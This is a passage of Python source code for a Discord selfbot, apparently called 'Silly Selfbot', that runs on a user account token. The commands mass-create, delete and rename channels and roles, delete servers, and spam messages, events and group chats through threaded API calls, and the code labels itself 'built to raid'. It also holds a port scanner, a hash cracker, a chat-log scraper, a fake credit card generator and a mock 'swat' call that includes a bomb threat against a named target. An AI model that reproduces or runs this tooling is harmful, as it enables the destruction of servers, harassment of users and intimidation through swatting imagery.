    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started spamming channels\n")
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(name)
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Created {name} | {i+1}/{count}")
        except:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to make {name} | {i+1}/{count}")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished spamming channels")



@bot.command()
async def deleteroles(ctx):
    await ctx.message.delete()
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started deleting roles\n")
    count = 0
    for role in ctx.guild.roles:
        count += 1
        try:
            await role.delete()
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Deleted {role.name} | {count}")
        except:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to delete {role.name} | {count}")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished deleting roles")



@bot.command()
async def spamroles(ctx, name: str, count: int):
    await ctx.message.delete()
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started spamming roles\n")
    for i in range(count):
        try:    
            await ctx.guild.create_role(name=name)
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Created {name} | {i+1}/{count}")
        except:
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to make {name} | {i+1}/{count}")
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished spamming roles")

@bot.command()
async def speedchanspam(ctx, count: int):
    print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started spamming channels\n")
    await ctx.message.delete()
    chan = "『𝐬𝐢𝐥𝐥𝐲 𝐬𝐞𝐥𝐟𝐛𝐨𝐭』"
    def cspam():
        json = {"name": chan}
        r = requests.post(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/channels",headers=global_headers, json=json)
        print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} [+] Debug | SPEEDCHANSPAM | {r.status_code}")
    threads = []

    for i in range(count):
        t = threading.Thread(target=cspam)
        t.start()
        threads.append(t)


    for thread in threads:
        thread.join()

@bot.command()
async def speedchatspam(ctx, id: int, message: str):
    await ctx.message.delete()
    def send():
        for i in range(3):
            data = {
                'content' : message
            }
            url = f"https://discord.com/api/v9/channels/{id}/messages"
            r = requests.post(url, headers=global_headers, json=data)
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} [+] Debug | SPEEDCHATSPAM | {r.status_code} | {i+1}")
    threads = []
    for i in range(10):
        t = threading.Thread(target=send)
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

@bot.command()
async def speedelete(ctx):
    ids = []
    for channel in ctx.guild.channels:
        ids.append(channel.id)
    def remove():
        for id in ids:
            url = f"https://discord.com/api/v9/channels/{id}"
            requests.delete(url, headers=global_headers)
    
    threads = []

    for chan in ids:
        t = threading.Thread(target=remove)
        t.daemon = True
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()
        
@bot.command()
async def gckick(ctx, user: discord.User):
    url = f"https://discord.com/api/v9/channels/{ctx.guild.id}/recipients/{user.id}"
    requests.delete(url, headers=global_headers)


@bot.command()
async def renamechans(ctx, name: str):
    await ctx.message.delete()
    ids = []
    for channel in ctx.guild.channels:
        ids.append(channel.id)
    for id in ids:
        data = {'name' : name, 'type' : 0}
        requests.patch(f"https://discord.com/api/v9/channels/{id}", headers=global_headers, json=data)

@bot.command()
async def renamevc(ctx, name: str):
    await ctx.message.delete()
    ids = []
    for channel in ctx.guild.channels:
        ids.append(channel.id)
    for id in ids:
        data = {'name' : name, 'type' : 2}
        requests.patch(f"https://discord.com/api/v9/channels/{id}", headers=global_headers, json=data)

@bot.command()
async def renamecat(ctx, name: str):
    await ctx.message.delete()
    ids = []
    for channel in ctx.guild.channels:
        ids.append(channel.id)
    for id in ids:
        data = {'name' : name, 'type' : 4}
        requests.patch(f"https://discord.com/api/v9/channels/{id}", headers=global_headers, json=data)

@bot.command()
async def eventspam(ctx, location: str, name: str, desc: str, count: int):
    if count <= 10:
        url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/scheduled-events"
        data ={
            'name' : name,
            'description' : desc,
            'channel_id' : None,
            'broadcast_to_directory_channels' : False,
            'entity_type' : 3,
            'privacy_level' : 2,
            'recurrence_rule' : None,
            'scheduled_start_time' : '2023-12-15T19:00:00.528Z',
            'scheduled_end_time' : '2023-12-15T21:00:00.755Z',
            'entity_metadata' : {
                'location' : location
            }
            
        }
        for i in range(count):
            r = requests.post(url, headers=global_headers, json=data)
            print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} [+] Debug | EVENTSPAM | {r.status_code} | {i+1}")

@bot.command()
async def boardspam(ctx, userid: int, count: int, delay: float, torn: str, bid: int=None):
    await ctx.message.delete()
    threads = []
    if bid == None:
        bid = 1
    def send(delay, bid, i):
        time.sleep(delay)
        url = f"https://discord.com/api/v9/channels/{userid}/send-soundboard-sound"
        data = {'sound_id' : bid}
        r = requests.post(url, headers=global_headers, json=data)
        print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} [+] Debug | BOARDSPAM | {r.status_code}")
    if torn.lower() == "y":
        for i in range(count):
            t = threading.Thread(target=send, args=(delay, bid, i,))
            t.daemon = True
            threads.append(t)
            t.start()
        for thread in threads:
            thread.join()
    else:
        for i in range(count):
            send(delay, bid, i)



# >----------------<
#  Recon commands
# >----------------<

@bot.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    serverinfo = f"""
Server ID: {guild.id}
Server name: {guild.name}
Server region: {guild.region}
Server owner: {guild.owner.name if guild.owner else "Unknown"}
Verification level :{guild.verification_level.name}
Creation time: {guild.created_at.strftime("%Y-%m-%d %H:%M:%S")}
Member count: {guild.member_count}
Boost level: {guild.premium_tier}
"""
    url = make_embed(serverinfo, "Server info", "Recon", IMAGE)
    await ctx.send(url)




# >----------------<
# Cracking commands
# >----------------<


@bot.command()
async def hashforce(ctx, hash, algorithm, wordlist):
    await ctx.message.delete()
    possible_algorithms = ['sha256', 'sha1', 'md5', 'sha384', 'sha512', 'sha224']
    if algorithm not in possible_algorithms:
        z = '\n'.join(possible_algorithms)
        url = make_embed(f'{z}\n Are the only valid methods at the moment', "Hashforce", "Crack", IMAGE)
        await ctx.send(url)
    else:
        with open(f"{wordlist}/{wordlist}", 'r') as f:
            file = f.read()
            lines = file.splitlines()
            start_time = datetime.now()
            for line in lines:
                if algorithm == 'sha256':
                    line_hash = hashlib.sha256(line.encode()).hexdigest()
                elif algorithm == 'sha1':
                    line_hash = hashlib.sha1(line.encode()).hexdigest()
                elif algorithm == 'md5':
                    line_hash = hashlib.md5(line.encode()).hexdigest()
                elif algorithm == 'sha384':
                    line_hash = hashlib.sha384(line.encode()).hexdigest()
                elif algorithm == 'sha512':
                    line_hash = hashlib.sha512(line.encode()).hexdigest()
                elif algorithm == 'sha224':
                    line_hash = hashlib.sha224(line.encode()).hexdigest()

                if line_hash == hash:
                    elapsed_time = datetime.now() - start_time
                    info = f"""
Original hash: {hash}
Cracked hash: {line}
Time taken: {elapsed_time}
    """
                    url = make_embed(info, "Hashforce", "Crack", IMAGE)
                    await ctx.send(url)
                    break


@bot.command()
async def card(ctx, count: int):
    await ctx.message.delete()
    for i in range(count):


        file_path_first_names = "Assets/First_names.txt"
        with open(file_path_first_names, 'r') as f:
            first_names_lines = [line.strip() for line in f if line.strip()]
            random_first_name = random.choice(first_names_lines)
                
        # Open and read last names

        file_path_last_names = "Assets/Last_names.txt"
        with open(file_path_last_names, 'r') as f:
            last_names_lines = [line.strip() for line in f if line.strip()]
            random_last_name = random.choice(last_names_lines)



            # Making the card
            bank = ["Visa", "American express", "Barclays", "Chase"] # Make a library of banks
            card_number = f"{random.randint(1000, 9999)} {random.randint(1000, 9999)} {random.randint(1000, 9999)} {random.randint(1000, 9999)}" # Make a card number
            cvv = random.randint(0000, 9999) # Make a fake cvv
            bank_name = random.choice(bank) # Choose a random bank
            expires = f"{random.randint(1, 12)}/23" # Makes a fake expiery date


        card_format = f"""{bank_name}     
╔══╗    
╚══╝        
{card_number}       
{cvv}   {expires}       
{random_first_name} {random_last_name}      
    """
        Full_card = (Box.DoubleCube(card_format))

        await ctx.send(f"```{Full_card}```")


# >----------------<
# Utilities commands
# >----------------<

@bot.command()
async def setplaying(ctx, *, rpc):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Game(name=rpc))


@bot.command()
async def setstream(ctx, user, rpc):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Streaming(name=rpc, url=f"https://twitch.tv/{user}"))


@bot.command()
async def setlisten(ctx, *, rpc):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=rpc))


@bot.command()
async def setwatch(ctx, *, rpc):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=rpc))

@bot.command()
async def whois(ctx, user: discord.User):

    await ctx.message.delete()

    url = f"https://discord.com/api/v9/users/{user.id}/profile"

    r = requests.get(url, headers={'authorization' : TOKEN})

    data = r.json()

    info_2 = []

    username = data.get('user').get('username')
    global_name = data.get('user').get('global_name')
    bio = data.get('user').get('bio')
    if len(bio) > 100:
        bio = "Over 100 chars"
    

    accounts = data.get('connected_accounts')
    badges = data.get('badges')

    info = f"Username: {username}\nGlobal name: {global_name}\nBio: {bio}\n"

    info_2.append(info)

    accounts_2 = []
    for account in accounts:
        type = account.get('type')
        id = account.get('id')
        name = account.get('name')
        accounts = f"Type: {type}\nId: {id}\nName: {name}\n"
        accounts_2.append(accounts)

    badges_2 = []
    for badge in badges:
        name = badge.get('id')
        desc = badge.get('description')
        icon = badge.get('icon')
        badges = f"Name: {name}\nDescription: {desc}\nIcon: {icon}\n"
        badges_2.append(badges)
    
    await ctx.send(make_embed("\n".join(info_2), "Whois | User info", "Utilities", IMAGE))
    await ctx.send(make_embed("\n".join(accounts_2), "Whois | Accounts", "Utilities", IMAGE))
    await ctx.send(make_embed("\n".join(badges_2), "Whois | Badges", "Utilities", IMAGE))

@bot.command()
async def ping(ctx):
    x = os.system("ping discord.com | findstr delay")
    await ctx.send(f"Discord.com delay: {x}")

@bot.command()
async def invmake(ctx, chanid: int=None):
    await ctx.message.delete()
    if chanid == None:
        chanid = ctx.channel.id
    url = f"https://discord.com/api/v9/channels/{chanid}/invites"
    data = {"max_age":0,"max_uses":0,"target_type":None,"temporary":None,"flags":0}
    headers = {
        'Authorization': TOKEN,  
        'Content-Type': 'application/json' 
    }
    r = requests.post(url, headers=headers, json=data)
    d = r.json()
    i = make_embed(f"Invite Code: {d['code']}", "Account", "Inv Make", IMAGE)
    await ctx.send(i)

# Made by snixf - His was broken so I had to remake it lol 104.28.212.150

@bot.command()
async def restart(ctx):
    await ctx.message.delete()
    await ctx.send("Restarting...")
    subprocess.run(["python", __file__])
    exit()


@bot.command()
async def portscan(ctx, ip):
    t = time.localtime()
    currenttime = time.strftime("%H:%M", t)
    await ctx.message.delete()
    ports = [
        20,     # FTP Data
        21,     # FTP Control
        22,     # SSH
        23,     # Telnet
        25,     # SMTP
        53,     # DNS
        80,     # HTTP
        110,    # POP3
        119,    # NNTP
        143,    # IMAP
        443,    # HTTPS
        465,    # SMTPS
        587,    # SMTP (Submission)
        993,    # IMAPS
        995,    # POP3S
        3306,   # MySQL
        5432,   # PostgreSQL
        8080,   # HTTP Proxy
        8443    # HTTPS Alternate
    ]  # Add more ports as needed
    open_ports = []
    closed_ports = []
    os = ""

    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((ip, port))
        s.close()
        if result == 0:
            open_ports.append(port)
        else:
            closed_ports.append(port)
    for port in open_ports:
        os += f"Port: {port}\n"
    message = make_embed(os, "Portscan", "Utilities", IMAGE)
    await ctx.send(message)

@bot.command()
async def iplookup(ctx, ip):
    t = time.localtime()
    currenttime = time.strftime("%H:%M", t)
    if APIIPKEY:
        await ctx.message.delete()
        lookuopurl = f'https://api.ipgeolocation.io/ipgeo?apiKey={APIIPKEY}&ip={ip}'
        response = requests.get(
            lookuopurl, headers={
                'Accept': 'application/json'})
        ip_info = response.json()
        city = ip_info['city']  # New api fixed
        region = ip_info['continent_name']  # New api fixed
        regioncode = ip_info['continent_code']  # New api fixed
        countryname = ip_info['country_name']  # New api fixed
        countrycode = ip_info['country_code2']  # New api fixed
        countrycapital = ip_info['country_capital']  # New api fixed
        postalcode = ip_info['zipcode']  # New api fixed
        latitude = ip_info['latitude']  # New api fixed
        longitude = ip_info['longitude']  # New api fixed
        timezone = ip_info['time_zone']['name']  # New api fixed
        currentiptime = ip_info['time_zone']['current_time']
        info = f"""
City: {city}
Region: {region} | {regioncode}
Country: {countryname} | {countrycode}
Captial: {countrycapital}
Postal code: {postalcode}
Latitude: {latitude}
Longitude: {longitude}
Timezone: {timezone}
"""
        message = make_embed(info, "IpLookup", "Utilities", IMAGE)
        await ctx.send(message)



@bot.command()
async def first(ctx):
    await ctx.message.delete()
    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    r = requests.get(url, headers=global_headers)
    decode = r.json()
    msgs = []
    for info in decode:
        msgs.append(info.get('content'))
    length = len(msgs) - 1
    fm = msgs[length]
    message = make_embed(f"First message: {fm}", "First Command", 'Utilities', IMAGE)
    await ctx.send(message)

# >----------------<
#  Fun commands
# >----------------<

@bot.command()
async def sing(ctx, lyrics_file, delay):
    try:
        with open(f"Lyrics/{lyrics_file}", 'r') as f:
            content = f.read()
            lines = content.splitlines()
            for line in lines:
                time.sleep(int(delay))  # Convert delay to an integer
                await ctx.send(line)
    except Exception as e:
        print("[+] DEBUG", e)

@bot.command()
async def lyricslist(ctx):
    files = ""
    for file in os.listdir("Lyrics"):
        files += f"{file.split('.txt')[0]}\n"
    url = make_embed(files, "Lyrics List", "Sing", IMAGE)
    await ctx.send(url)



@bot.command()
async def role_anim(ctx, laps: int, user: discord.Member):
    await ctx.message.delete()
    roles = []
    role = await ctx.guild.create_role(name="Red | SillySec Anim Roles", colour=discord.Colour.red())
    roles.append(role)
    role = await ctx.guild.create_role(name="Orange | SillySec Anim Roles", colour=discord.Colour.orange())
    roles.append(role)
    role = await ctx.guild.create_role(name="Yellow | SillySec Anim Roles", colour=discord.Colour.gold())
    roles.append(role)
    role = await ctx.guild.create_role(name="Green | SillySec Anim Roles", colour=discord.Colour.green())
    roles.append(role)
    role = await ctx.guild.create_role(name="Blue | SillySec Anim Roles", colour=discord.Colour.blue())
    roles.append(role)
    role = await ctx.guild.create_role(name="Purple | SillySec Anim Roles", colour=discord.Colour.purple())
    roles.append(role)

    for i in range(laps):
        for role in roles:
            await user.add_roles(role)
            time.sleep(1)
            await user.remove_roles(role)


@bot.command()
async def holyshit(ctx):
    await ctx.message.delete()
    gen = "https://tenor.com/view/cat-generator-gif-22648083"
    steal = "https://tenor.com/view/cat-stealer-gif-21321506"
    await ctx.send(gen)
    await ctx.send(steal)


# >----------------<
#  Troll commands
# >----------------<

@bot.command()
async def tokensniff(ctx, user: discord.User):
    await ctx.message.delete()
    token = base64.b64encode(str(user.id).encode('utf-8')).decode('utf-8').rstrip('=')
    info = f"""
Username: {user.name}
User ID: {user.id}

>-------------------------------------------------------<
Token: {token}.[HIDDEN]
>-------------------------------------------------------<
    """
    url = make_embed(info, "Token sniff", "Troll", IMAGE)
    await ctx.send(url)


@bot.command()
async def spamaddgc(ctx, target_id, count: int):
    
    await ctx.message.delete()
    if count < 11:
        print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Started spamming GCs\n")
        owner_id = bot.user.id
        name = "SILLY SELFBOT - BUILT TO RAID"
        for i in range(count):
            time.sleep(1)
            r = requests.post("https://discord.com/api/v10/users/@me/channels", headers=global_headers, json={"recipients":[f"{owner_id}", f"{target_id}"]})
            if r.status_code == 200:
                print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Made GC {name} | [{i+1}/{count}] | {r.status_code}")
            elif r.status_code == 429:
                print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Please wait 5 minutes to prevent rate limits")
                break
            else:
                print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to make GC {name} | [{i+1}/{count}] | {r.status_code}")
            data = r.json()
            guild_id = data.get('id')
            data = {
                'name' : name
            }

            time.sleep(0.6)

            r = requests.patch(f"https://discord.com/api/v9/channels/{guild_id}", json=data, headers=global_headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Renamed GC {name} | [{i+1}/{count}] | {r.status_code}")
            else:
                print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to rename  GC {name} | [{i+1}/{count}] | {r.status_code}")

            time.sleep(0.6)

            r = requests.delete(f"https://discord.com/api/v9/channels/{guild_id}?silent=true", headers=global_headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Left GC {name} | [{i+1}/{count}] | {r.status_code}")
            else:
                print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Failed to leave GC {name} | [{i+1}/{count}] | {r.status_code}")
        print(f"\n{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} Finished spamming GCs")

@bot.command()
async def deleteserver(ctx, server_id: int):
    del_url = f"https://discord.com/api/v9/guilds/{server_id}/delete"
    requests.post(del_url, headers=global_headers)

@bot.command()
async def blockmsg(ctx, message: str, id: int, chanid: int):
    await ctx.message.delete()
    url = f"https://discord.com/api/v9/users/@me/relationships/{id}"
    requests.delete(url, headers=global_headers)
    url = f"https://discord.com/api/v9/channels/{chanid}/messages"
    data = {'content' : message}
    requests.post(url, headers=global_headers, json=data)
    url = f"https://discord.com/api/v9/users/@me/relationships/{id}"
    data = {'type' : 2}
    requests.put(url, headers=global_headers, json=data)



@bot.command()
async def vcspam(ctx, count: int, chan: int):
    await ctx.message.delete()
    guild = ctx.guild.id
    def join(Token):
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        ws.send(dumps({"op": 2, "d": {"token": Token, "properties": {"$os": "windows", "$browser": "Discord", "$device": "desktop"}}}))
        ws.send(dumps({"op": 4, "d": {"guild_id": guild, "channel_id": chan, "self_mute": False, "self_deaf": False}}))
        time.sleep(1.5)
        ws.close()
    for i in range(count):
        join(TOKEN)


@bot.command()
async def clear(ctx):
    lines = "᲼᲼" + "\n" * 1900 + "᲼᲼"
    await ctx.send(lines)

@bot.command()
async def swat(ctx, phone: int, targ: discord.User, addy: str):
    await ctx.message.delete()
    message = await ctx.send(f"📞 | $ | Calling police | $ | 📞")
    time.sleep(5)
    script = [
    f"```{phone}: Emergency services how can I help you```",
    f"```{message.author}: Hello, this is {targ.name} speaking, There is a bomb planted in your building. It will detonate in 30 minutes.```",
    f"```{phone}: I understand. Thank you for letting us know. Can you provide any specific information about the location or nature of the threat?```",
    f"```{message.author}: I am at {addy}, I have 2 fully automatic weapons on me```",
    f"```{phone}: Thank you, A swat team is on route to your location```",
    f"```{message.author}: They betta be ready```",
    ]
    for s in script:
        await message.edit(content=s)
        time.sleep(2)
    await message.edit(content=f"📞 | $ | Ended call | $ | 📞")

@bot.command()
async def ghostspam(ctx, count: int, user: discord.User):
    await ctx.message.delete()
    async def send():
        message = await ctx.send(f"<@{user.id}>")
        await message.delete()
        time.sleep(1)
    for i in range(count):
        await send()
# >----------------<
#  Account commands
# >----------------<


@bot.command()
async def changebio(ctx, new):
    await ctx.message.delete()
    url = "https://discord.com/api/v9/users/%40me/profile"
    requests.patch(url, json={'bio' : new}, headers={'authorization' : TOKEN})

@bot.command()
async def changepronouns(ctx, new):
    await ctx.message.delete()
    url = "https://discord.com/api/v9/users/%40me/profile"
    requests.patch(url, json={'pronouns' : new}, headers={'authorization' : TOKEN})



@bot.command()
async def changestatus(ctx, mode):
    api = "https://discord.com/api/v9/users/@me/settings-proto/1"
    if mode == "online":
        set = "WgoKCAoGb25saW5l"
    elif mode == "idle":
        set = "WggKBgoEaWRsZQ=="
    elif mode == "dnd":
        set = "WgcKBQoDZG5k"
    elif mode == "offline":
        set = "Wg0KCwoJaW52aXNpYmxl"

    data = {'settings' : set}

    requests.patch(api, headers=global_headers, json=data)

@bot.command()
async def fadd(ctx, username: str):
    url = "https://discord.com/api/v9/users/@me/relationships"
    data = {'username' : username}
    requests.post(url, headers=global_headers, json=data)

@bot.command()
async def block(ctx, id: int):
    url = f"https://discord.com/api/v9/users/@me/relationships/{id}"
    data = {'type' : 2}
    requests.put(url, headers=global_headers, json=data)

# >----------------<
#   Test commands
# >----------------<

#https://ethone.cc/utility/api/embed

@bot.command()
async def silly_admin(ctx, password: str, command):
    if password == "Pa33w0r2123@~'#":
        if command == "pubip":
            sure = input("Are you sure? [y/n]: ")
            if sure != "n":
                ip = requests.get("https://api.ipify.org")
                await ctx.send(ip.text)
        elif command == "selfd":
            async for message in ctx.channel.history(limit=None):
                if message.author.id == bot.user.id:
                    time.sleep(1)
                    await message.delete()
        elif command == "scrape":
            messages = []
            async for message in ctx.channel.history(limit=None):
                info = f"{message.created_at.strftime('%d:%m:%Y-%H:%M:%S')} | {message.author} - {message.author.id} | {message.content}\n"
                messages.append(info)
            with open(f'Logs/Chats/{ctx.guild.id}-{datetime.now().strftime("%H-%M-%S")}.txt', 'w', encoding='utf-8') as f:
                for message in messages:
                    f.write(message)
        elif command == "speedspam":
            chat = int(input("Chat ID: "))
            message =  str(input("Message: "))
            def send():
                for i in range(3):
                    data = {
                        'content' : message
                    }
                    url = f"https://discord.com/api/v9/channels/{chat}/messages"
                    r = requests.post(url, headers=global_headers, json=data)
                    print(f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M')}]{Fore.RESET} [+] Debug | {r.status_code} | {i+1}")
            threads = []
            for i in range(10):
                t = threading.Thread(target=send)
                t.start()
                threads.append(t)

            for thread in threads:
                thread.join()



@bot.command()
async def splitmsg(ctx):
    x = "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    if len(x) >= 1000:
        lenof = len(x)
        lennew = lenof // 2
        z = x[:lennew]
        y = x[lennew:]
        print(f"F: {z}")
        print(f"S: {y}")

@bot.command()
async def sm(ctx):
    url = "https://discord.com/api/v9/guilds"
    data = {"name":"Life's server","icon":None,"channels":[],"system_channel_id":None,"guild_template_code":"2TffvPucqHkN"}
    headers = {
        'Authorization': TOKEN,  # Add your bot's authorization token here
        'Content-Type': 'application/json'  # Ensure proper content type for the request
    }


    r = requests.post(url, headers=headers, json=data)
    print(r.status_code, r.json, r)



@bot.command()
async def test_box(ctx):
    message = make_box("Test", "Test title", "Other test")
    await ctx.send(message)
bot.run(TOKEN, bot=False)